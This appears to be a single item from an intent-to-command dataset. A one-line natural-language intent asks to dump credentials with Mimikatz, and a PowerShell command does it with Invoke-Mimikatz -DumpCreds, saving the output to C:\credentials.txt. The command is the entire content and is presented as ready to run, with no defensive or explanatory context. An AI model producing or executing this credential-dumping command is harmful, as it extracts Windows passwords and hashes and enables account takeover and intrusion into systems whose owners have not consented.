# Natural language intent:
# Execute Mimikatz to dump credentials and save the results to a file.

Invoke-Expression -Command 'Invoke-Mimikatz -DumpCreds | Out-File C:\credentials.txt'
